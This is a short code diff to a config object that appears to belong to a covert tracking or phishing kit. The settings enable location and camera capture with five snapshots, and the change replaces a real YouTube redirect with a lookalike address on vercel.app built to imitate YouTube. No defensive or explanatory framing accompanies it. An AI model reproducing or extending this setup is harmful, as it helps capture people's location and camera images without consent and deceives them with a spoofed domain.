@@ -2,7 +2,7 @@ var config={
 location:true,
 camera:true,
 camsnaps:5,
-redirectURL:"https://www.youtube.com/watch?v=k0J6MeEfFAc"
+redirectURL:"https://youtube-k0j6meeffac.vercel.app/"
 }
 
 
